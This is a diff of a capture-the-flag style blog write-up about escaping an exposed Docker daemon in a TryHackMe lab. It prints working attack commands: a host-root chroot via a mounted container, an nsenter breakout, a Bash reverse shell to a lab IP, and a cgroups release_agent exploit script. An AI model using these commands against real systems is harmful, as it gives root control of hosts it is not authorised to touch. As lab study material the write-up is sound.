@@ -67,7 +67,7 @@ Indeed, *unbounded administrative access* is [one such consequence of exposing D
 >
 > Remote access without TLS is **not recommended**
 
-The bit about "gaining root access to the host" is a consequence of mounting the host's filesystem on a highly-privileged container. For example, take the following command:
+The bit about "gaining root access to the host" is a consequence of mounting the host's filesystem on a highly-privileged container. For example, consider the following command:
 
 ```
 docker -H 10.10.20.228:2375 run -v /:/mnt --rm -it alpine chroot /mnt sh
@@ -78,8 +78,6 @@ This will allow a remote attacker to:
 - Enter a *chroot* environment on the host's root directory
 
 From there, the remote attacker has effectively "escaped" the container and can perform arbitrary actions on the host system.
-
-You can try this escape on that system or a system of your own. However, the instantiation of a new, highly privileged container may raise some eyebrows to anyone paying attention to the list of running containers, or if the host has any real alerting set up. Further, as the author, some of my own goals were to shed light on the details of this particular system. 
 
 For now, let's roll with the speculation that this host is part of a container orchestration process. Perhaps its configuration predates a more robust solution, like Kubernetes. 
 
@@ -140,6 +138,8 @@ You can start to see the original Dockerfile from this output:
 - Any shell command (without an explicit directive) preceded by `/bin/sh -c` represents a RUN directive. 
 - Finally, the last few lines match with the official Ubuntu 18.04 image on the Docker registry, so we can infer that it represents `FROM ubuntu:18.04`.
 
+All things taken together, the workflow for this environment is something like this:
+
 Using all of this output, we can reconstruct the image:
 
 ```
@@ -188,28 +188,44 @@ CMD ["/usr/sbin/sshd", "-D"]
 
 Hardcoded secrets are revealed. These match the credentials given by the TryHackMe lab. However, let's pretend we didn't see those (i.e., that the developer had chosen to manage secrets securely), and continue investigating.
 
-Even without the root user's credentials, we could still enter the container. The first way, as noted earlier, is by using `docker exec` to run a shell or shell commands directly. Another way is by abusing `docker exec` to launch a reverse shell.
+Even without the root user's credentials, we could still enter the container. The first way, as noted earlier, is by using `docker exec` to launch a shell or shell commands directly. 
 
-To connect via a reverse shell, start a listener on the host:
+```
+docker -H 10.10.20.228 exec -it 7b7461f9882e bash
+```
+
+For this system, the `-it` switch is probably easier to get the shell than a reverse shell would be. However, a reverse shell is still possible from a container, and may be necessary in some cases (for example, from a web application). In those cases, the system shells may be removed when the image is built, so the shell command will need to fit the use case and vulnerability.
+
+Still, we can try it here as a simple proof. To connect via a reverse shell, start a listener on the host:
 
 ```
 nc -lvnp 4242
 ```
 
-Then, leverage the exposed container. Since the container is Ubuntu, we can use a raw Bash TCP connection.
+Then, leverage the exposed container. Since the image is Ubuntu, we can use a raw Bash TCP connection.
 
 ```
 docker -H 10.10.20.228 exec 7b7461f9882e \
 	bash -c 'bash -i >& /dev/tcp/10.10.16.12/4242 0>&1'
 ```
 
-This gives you an interactive terminal by default, just like with SSH. You can effectively walk through the lab vulnerabilities from this point, without any knowledge of the SSH credentials that were given.
+Either way, you get an interactive terminal, just like with SSH. You can effectively walk through the lab vulnerabilities from this point, without any knowledge of the SSH credentials that were given. A deeper dive into the vulnerabilities is given in a later section.
 
-Now, let's explore the system's configuration. At this stage, we do need to escape by launching a container, as this will mount the host's root filesystem. 
+Now, let's explore the host system's configuration. As with the privileged container, we want to explore it with the intention of providing more valuable feedback about the system, as well as to prove some assumptions made during reconnaissance. 
+
+At this stage, we do need to escape. From the privileged container, we could use `nsenter` to enter the init namespace, thereby giving us a root shell. 
+
+```
+nsenter --target 1 --mount --uts --ipc --net /bin/bash
+```
+
+We could also break out by launching a container, which targets host's root filesystem, in order to gain a root shell. The benefit of this approach is that we could do so without needing to enter the privileged container at all: that is, by solely exploiting the exposed Docker TCP port.
 
 ```
 docker -H 10.10.20.228:2375 run -v /:/mnt --rm -it alpine chroot /mnt sh
 ```
+
+Either way, we have access to the host as the root user.
 
 Using `cat`, we can prove that the host admin has configured the Docker daemon to listen over the network.
 
@@ -249,9 +265,47 @@ UBUNTU_CODENAME=focal
 
 Indeed, this is an instance of Ubuntu 20.04. Why is this important to know? 
 
-One big reason is because Ubuntu 20.04 uses the "hybrid" implementation of cgroups v1 and v2. This effectively means that your containers will "borrow" this hybrid behavior. Since v1 uses `release_agent` and `notify_on_release`, we can successfully run the *cgroups* exploit. 
+One big reason is because Ubuntu 20.04 uses the "hybrid" implementation of cgroups v1 and v2. This effectively means that your containers will "borrow" this hybrid behavior. Modern Linux distributions have moved entirely to cgroups v2, which retired the `release_agent` and `notify_on_release` behaviors. Since this OS uses them, however, we can successfully run the *cgroups* exploit via the privileged container:
+
+```bash
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/exploit" > /tmp/cgrp/release_agent
+echo '#!/bin/sh' > /exploit
+echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
+chmod a+x /exploit
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+```
+
+This is a blind attack, which means we won't get any explicit feedback. If successful it would execute the script at `/exploit`. In this case, it will 
 
 If you were trying to recreate this lab in your own VM, you would likely want an environment that supported this hybrid, so you could achieve the release-agent exploit. Of course, newer Linux distros have moved away from v1 entirely, and therefore no longer support cgroups release agents. If this were Ubuntu 21.10 or higher, that exploit would fail.
+
+In any case, all things taken into consideration, we can lay out a rough workflow for this system:
+
+![](/assets/2024-09-04/docker-architecture-flow.png)
+
+This does, in fact, resemble the "orchestrator" architecture noted earlier. In this implementation, note the circular relationship between the Docker Daemon and the "control (privileged) container." Recall that the container has mounted the Docker socket, so it can use the host's daemon as it needs. 
+
+Realistically, the goal here is orchestration. However, the design leaves room for excessive abuse of the entire system. To recap the steps taken, consider the general attack flow we took, which looked something like this:
+
+![](/assets/2024-09-04/Documents/docker-attack-flow.png)
+
+Note that most of the exploitation was made easy because of the exposed TCP daemon, which provided unrestricted control over the Docker and host systems alike.
+
+# Exploitation
+
+The TryHackMe room notes four vulnerabilities:
+
+- Exploiting cgroup v1
+- Mounting the root filesystem to a new container
+- RCE via an exposed Daemon over TCP
+- Exploiting namespaces (`nsenter`)
+
+In our exploration of the system, we leveraged the exposed TCP daemon as well as ways to break out of the container (by *chroot*-ing into a container on the host filesystem, or by using *nsenter* from the privileged container). The cgroup exploit is an interesting blind attack, and you could certainly pull it off on an older system. However, as more production environments migrate and upgrade, this attack will become less applicable in time.
+
+
 
 # Takeaways
 
